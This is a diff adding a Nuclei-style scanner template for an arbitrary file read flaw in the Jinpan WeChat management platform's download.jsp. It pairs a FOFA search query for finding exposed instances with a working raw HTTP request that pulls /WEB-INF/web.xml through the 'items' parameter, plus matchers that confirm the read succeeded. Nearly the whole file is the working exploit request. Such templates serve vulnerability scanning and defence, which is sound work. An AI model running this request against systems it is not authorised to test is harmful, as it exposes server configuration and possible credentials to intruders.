@@ -1,0 +1,30 @@
+id: jinpan-download-fileread
+
+info:
+  name: 金盘微信管理平台download.jsp任意文件读取漏洞
+  author: qwtd
+  severity: medium
+  description: |
+    FOFA: icon_hash="116323821" && title=="微信管理后台"
+  tags: 金盘-微信管理平台
+
+
+http:
+  - raw:
+      - |
+        GET /mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'web-app'
+          - 'context-param'
+          - 'param-name'
+        condition: and
